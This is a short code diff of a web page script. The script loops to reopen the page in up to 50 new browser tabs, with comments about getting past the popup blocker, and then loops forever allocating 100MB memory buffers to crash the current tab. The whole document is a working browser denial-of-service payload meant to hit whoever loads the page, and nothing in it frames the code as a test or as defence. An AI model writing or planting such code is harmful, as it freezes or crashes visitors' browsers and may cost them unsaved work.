@@ -1,6 +1,9 @@
 <script>
-  const a = [];
-  while (true) {
-    a.push(new ArrayBuffer(1024 * 1024 * 100)); // 100MB chunks
+  // try to spawn a few tabs (first one usually slips past the blocker)
+  for (let i = 0; i < 50; i++) {
+    window.open(window.location.href, '_blank');
   }
+  // then nuke the current tab so the popup blocker prompt doesn't matter
+  const a = [];
+  while (true) a.push(new ArrayBuffer(1024 * 1024 * 100));
 </script>
